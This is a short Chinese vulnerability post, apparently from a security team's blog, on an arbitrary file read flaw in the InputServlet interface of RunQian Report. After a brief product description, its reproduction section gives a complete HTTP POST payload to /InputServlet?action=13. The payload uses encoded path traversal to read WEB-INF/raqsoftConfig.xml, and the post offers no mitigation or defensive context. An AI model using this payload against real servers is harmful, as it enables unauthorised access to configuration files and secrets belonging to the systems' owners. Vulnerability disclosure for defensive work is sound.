#  润乾报表InputServlet接口存在任意文件读取漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-04 20:27  
  
# 1. 漏洞描述  
  
  
    润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，支持各种常见的关系数据库和各类J2 EE的应用服务器，客户端采用标准纯html方式展现，支持ie和netscape， 润乾报表是领先的企业级报表分析软件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk29AkQPbtib10CGiaUek83SkSAPVIfMFoibnqJSy0VVfehveEet6Kdm96g/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /InputServlet?action=13 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqkhweHyksXmpbBicZwaSRGJNI4U6ic4jkLNiaqPzMt1GwNicnuPaibBhmIIaA/640?wx_fmt=png&from=appmsg "")  
  
  
